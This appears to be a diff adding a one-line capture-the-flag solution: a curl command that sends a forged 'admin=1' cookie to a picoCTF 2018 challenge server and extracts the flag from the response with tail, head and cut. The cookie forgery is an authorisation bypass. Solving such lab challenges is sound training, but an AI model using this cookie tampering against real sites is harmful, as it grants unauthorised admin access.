@@ -1,0 +1,1 @@
+curl --cookie "admin=1" http://2018shell.picoctf.com:14664/flag | tail -n 14 | head -n 1 | cut -b 78- | cut -d '>' -f1 | cut -d '<' -f1
